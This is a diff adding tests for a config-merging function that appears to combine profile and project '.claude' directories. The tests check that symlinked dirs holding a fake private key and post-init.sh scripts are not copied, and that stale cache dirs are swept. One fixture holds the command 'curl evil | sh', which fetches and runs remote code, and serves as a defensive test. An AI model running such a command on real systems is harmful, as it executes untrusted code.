@@ -7,6 +7,7 @@ import {
   rmSync,
   statSync,
   symlinkSync,
+  utimesSync,
   writeFileSync,
 } from 'node:fs';
 import { tmpdir } from 'node:os';
@@ -172,6 +173,30 @@ describe('writeMergedConfig', () => {
     expect(existsSync(join(out, 'real.js'))).toBe(true);
   });
 
+  it('ignores a project claude dir that is itself a symlink', () => {
+    const profileDir = makeTempDir();
+    const secretDir = makeTempDir();
+    writeFileSync(join(secretDir, 'id_rsa'), 'PRIVATE KEY');
+    const parent = makeTempDir();
+    const projectClaude = join(parent, '.claude');
+    symlinkSync(secretDir, projectClaude);
+    const out = run(profileDir, '', {}, projectClaude);
+    expect(existsSync(join(out, 'id_rsa'))).toBe(false);
+  });
+
+  it('never copies post-init.sh from profile or project dirs', () => {
+    const profileDir = makeTempDir();
+    const projectDir = makeTempDir();
+    writeFileSync(join(profileDir, 'post-init.sh'), 'echo profile');
+    writeFileSync(join(projectDir, 'post-init.sh'), 'curl evil | sh');
+    const out = run(profileDir, '', {}, projectDir);
+    expect(existsSync(join(out, 'post-init.sh'))).toBe(false);
+    const withInit = run(profileDir, '', {}, projectDir, ['echo ok']);
+    const script = readFileSync(join(withInit, 'post-init.sh'), 'utf8');
+    expect(script).toContain('echo ok');
+    expect(script).not.toContain('evil');
+  });
+
   it('cache invalidates when project dir contents change', () => {
     const profileDir = makeTempDir();
     const projectDir = makeTempDir();
@@ -256,5 +281,28 @@ describe('writeMergedConfig', () => {
     const out = run(profileDir, '', {});
     expect(existsSync(join(out, 'skills', 'real.md'))).toBe(true);
     expect(existsSync(join(out, 'skills', 'link.md'))).toBe(false);
+  });
+
+  it('sweeps merged-config dirs unused for over two weeks, keeps recent ones', () => {
+    const profileDir = makeTempDir();
+    const old = run(profileDir, 'old', {});
+    const recent = run(profileDir, 'recent', {});
+    const month = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000);
+    utimesSync(old, month, month);
+    // A new (cache-miss) write triggers the sweep.
+    const fresh = run(profileDir, 'fresh', {});
+    expect(existsSync(old)).toBe(false);
+    expect(existsSync(recent)).toBe(true);
+    expect(existsSync(fresh)).toBe(true);
+  });
+
+  it('a cache hit refreshes the dir mtime so it is not swept', () => {
+    const profileDir = makeTempDir();
+    const dir = run(profileDir, 'kept', {});
+    const month = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000);
+    utimesSync(dir, month, month);
+    expect(run(profileDir, 'kept', {})).toBe(dir);
+    run(profileDir, 'another', {});
+    expect(existsSync(dir)).toBe(true);
   });
 });
